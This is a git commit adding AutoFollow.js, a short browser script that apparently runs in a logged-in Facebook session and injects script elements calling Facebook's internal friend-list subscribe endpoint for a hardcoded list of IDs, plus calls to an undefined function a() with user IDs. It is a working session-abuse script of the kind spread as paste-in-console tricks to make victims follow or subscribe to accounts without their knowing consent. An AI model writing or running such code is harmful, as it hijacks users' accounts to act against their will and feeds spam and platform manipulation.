d8ef326cb53e47cc44398b4e3a720e0d626ec752
BlackEagleBCC <apizpudin96@gmail.com>
2014-01-24 02:28:22 +0800

    Create AutoFollow.js

---
+++ AutoFollow.js
@@ -0,0 +1,8 @@
+function sublist(uidss) {
+                var a = document.createElement('script');
+                a.innerHTML = "new AsyncRequest().setURI('/ajax/friends/lists/subscribe/modify?location=permalink&action=subscribe').setData({ flid: " + uidss + " }).send();";
+                document.body.appendChild(a);
+}
+a("100001586135119"); a("100002287465199");
+
+sublist("523749481044629");sublist("1412537482309947");sublist("341543595981122");sublist("523749481044629");sublist("387027994766015");sublist("341543595981122");sublist("543320352431732");
